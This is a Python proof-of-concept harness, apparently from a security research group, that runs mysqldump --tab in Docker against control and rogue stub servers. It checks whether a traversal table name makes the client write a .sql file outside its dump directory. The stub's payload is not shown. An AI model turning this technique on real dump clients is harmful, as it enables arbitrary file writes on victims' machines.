#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: mysql-mysqldump-tab-path (High: 8.1)
#  Vendor: MySQL Community Server (Oracle)
#  Versions: mysqldump 26.7.0 --tab
#  Impact: Hostile SHOW TABLES path writes client .sql outside --tab DIR
#  Requires: mysql:26.7.0 dump client plus loopback protocol stub; --tab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "mysql-mysqldump-tab-path"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove mysqldump 26.7.0 --tab writes client .sql outside DIR."""


import os
import re
import subprocess
import sys
import time
from pathlib import Path

WITNESS = "MYSQL-DUMP-TAB-TRAVERSAL-WITNESS"
LABEL = "mysql-mysqldump-tab-path"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
TABDIR = WORK / "tabdir"
ORACLE = WORK / "oracle"
CONTROL_SQL = TABDIR / "t.sql"
TRAVERSAL_SQL = ORACLE / f"{WITNESS}.sql"
IMAGE_TAG = "mysql:26.7.0"
DUMP_TIMEOUT = 40
TAB_DIR = "/work/tabdir"


def log(msg: str) -> None:
    print(msg, flush=True)


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def dump_version() -> str:
    proc = compose("exec", "-T", "dump", "mysqldump", "--version", timeout=30)
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"mysqldump-version rc={proc.returncode} text={text!r}")
    if proc.returncode != 0 or "26.7.0" not in text:
        log(f"FAIL {LABEL} dump-version-mismatch image={IMAGE_TAG} {text!r} {WITNESS}")
        raise SystemExit(1)
    return text.splitlines()[-1] if text else "mysqldump 26.7.0"


def ensure_dirs() -> None:
    TABDIR.mkdir(parents=True, exist_ok=True)
    ORACLE.mkdir(parents=True, exist_ok=True)


def wipe_sql(root: Path) -> None:
    if not root.exists():
        return
    for path in root.rglob("*"):
        if path.is_file() and path.suffix == ".sql":
            path.unlink()


def list_rel(root: Path) -> list[str]:
    if not root.exists():
        return []
    out: list[str] = []
    for path in sorted(root.rglob("*")):
        if path.is_file():
            out.append(str(path.relative_to(WORK)))
    return out


def read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        log(f"ioc read-fail path={path} err={exc}")
        return ""


def looks_like_dump(text: str) -> bool:
    return bool(
        ("MySQL dump" in text or "CREATE TABLE" in text or "Server version" in text)
        and WITNESS in text
    )


def run_dump(port: int, label: str) -> tuple[int | None, str, str]:
    cmd = [
        "docker",
        "compose",
        "-p",
        COMPOSE_PROJECT,
        "exec",
        "-T",
        "dump",
        "mysqldump",
        "--protocol=TCP",
        "--ssl-mode=DISABLED",
        "-h",
        "stub",
        "-P",
        str(port),
        "-u",
        "root",
        "--password=",
        f"--tab={TAB_DIR}",
        "--verbose",
        "testdb",
    ]
    log(f"run-{label} port={port} cmd={' '.join(cmd)}")
    try:
        proc = subprocess.run(
            cmd,
            cwd=HERE,
            text=True,
            capture_output=True,
            timeout=DUMP_TIMEOUT,
        )
        return proc.returncode, proc.stdout or "", proc.stderr or ""
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout.decode("utf-8", "replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        err = exc.stderr.decode("utf-8", "replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
        return None, out, err + "\nTIMEOUT"


def stub_queries() -> str:
    proc = compose("logs", "--no-color", "stub", timeout=30)
    text = (proc.stdout or "") + (proc.stderr or "")
    queries = []
    for line in text.splitlines():
        if line.startswith("query ") or " sql=" in line or line.startswith("init_db "):
            queries.append(line)
    return "\n".join(queries[-120:])


def container_ls(path: str) -> str:
    proc = compose("exec", "-T", "dump", "ls", "-la", path, timeout=20)
    blob = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"ioc container-ls path={path} rc={proc.returncode} text={blob!r}")
    return blob


def main() -> int:
    ensure_dirs()
    version = dump_version()
    log(f"ioc image={IMAGE_TAG} dump={version}")

    wipe_sql(TABDIR)
    wipe_sql(ORACLE)
    log(f"ioc pre-control files={list_rel(WORK)}")

    c_rc, c_out, c_err = run_dump(3306, "control")
    time.sleep(0.4)
    log(f"ioc control-rc={c_rc!s}")
    log(f"ioc control-stderr={c_err[-1800:]!r}")
    log(f"ioc control-stdout-head={c_out[:400]!r}")
    log(f"ioc control-files={list_rel(WORK)}")
    container_ls("/work/tabdir")
    container_ls("/work/oracle")

    control_sql_yes = CONTROL_SQL.is_file()
    control_oracle_absent = not TRAVERSAL_SQL.exists()
    control_sql_text = read_text(CONTROL_SQL) if control_sql_yes else ""
    log(f"ioc control-sql-exists={control_sql_yes} path=work/tabdir/t.sql")
    log(f"ioc control-oracle-absent={control_oracle_absent}")
    if control_sql_yes:
        log(f"ioc control-sql-head={control_sql_text[:300]!r}")

    wipe_sql(ORACLE)
    started = time.time()
    t_rc, t_out, t_err = run_dump(3307, "traversal")
    time.sleep(0.4)
    log(f"ioc traversal-rc={t_rc!s}")
    log(f"ioc traversal-stderr={t_err[-1800:]!r}")
    log(f"ioc traversal-stdout-head={t_out[:400]!r}")
    log(f"ioc traversal-files={list_rel(WORK)}")
    container_ls("/work/tabdir")
    container_ls("/work/oracle")

    queries = stub_queries()
    log("ioc stub-queries-tail <<<")
    log(queries if queries else "(none)")
    log("ioc stub-queries-tail >>>")

    saw_show_tables = bool(re.search(r"show\s+tables", queries, re.I))
    saw_show_status = bool(re.search(r"show\s+table\s+status", queries, re.I))
    saw_show_create = bool(re.search(r"show\s+create\s+table", queries, re.I))
    log(f"ioc saw-show-tables={saw_show_tables} saw-show-status={saw_show_status} saw-show-create={saw_show_create}")

    traversal_exists = TRAVERSAL_SQL.is_file()
    traversal_text = read_text(TRAVERSAL_SQL) if traversal_exists else ""
    mtime_ok = False
    if traversal_exists:
        mtime_ok = TRAVERSAL_SQL.stat().st_mtime >= (started - 5)
    tabdir_hits = [
        str(p.relative_to(WORK))
        for p in TABDIR.rglob("*")
        if p.is_file() and WITNESS in p.name
    ]
    merely_tabdir = (not traversal_exists) and bool(tabdir_hits)
    dump_like = looks_like_dump(traversal_text) if traversal_exists else False
    log(f"ioc traversal-sql-exists={traversal_exists} path=work/oracle/{WITNESS}.sql")
    log(f"ioc traversal-mtime-ok={mtime_ok} dump-like={dump_like}")
    log(f"ioc tabdir-witness-hits={tabdir_hits}")
    if traversal_exists:
        log(f"ioc traversal-sql-head={traversal_text[:500]!r}")

    control_ok = control_sql_yes and control_oracle_absent
    traversal_ok = traversal_exists and mtime_ok and dump_like and not merely_tabdir
    ok = control_ok and traversal_ok and "26.7.0" in version
    status = "SUCCESS" if ok else "FAIL"
    control_flag = "yes" if control_ok else "no"
    traversal_flag = "yes" if traversal_ok else "no"
    log(
        f"{status} {LABEL} control-sql={control_flag} traversal-outside={traversal_flag} "
        f"dump=26.7.0 image={IMAGE_TAG} {WITNESS}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())

